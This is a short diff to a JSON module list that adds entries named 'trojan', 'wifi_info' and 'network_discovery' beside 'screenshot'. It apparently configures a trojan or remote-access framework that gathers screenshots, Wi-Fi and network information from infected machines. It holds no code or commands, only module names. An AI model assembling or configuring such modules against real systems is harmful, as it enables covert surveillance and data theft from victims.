@@ -1,6 +1,14 @@
 [
-	
+	{
+	"module":"trojan"
+	},
+	{
+	"module":"wifi_info"
+	},
 	{
 	"module" : "screenshot"
+	},
+	{
+	"module" : "network_discovery"
 	}
 ]
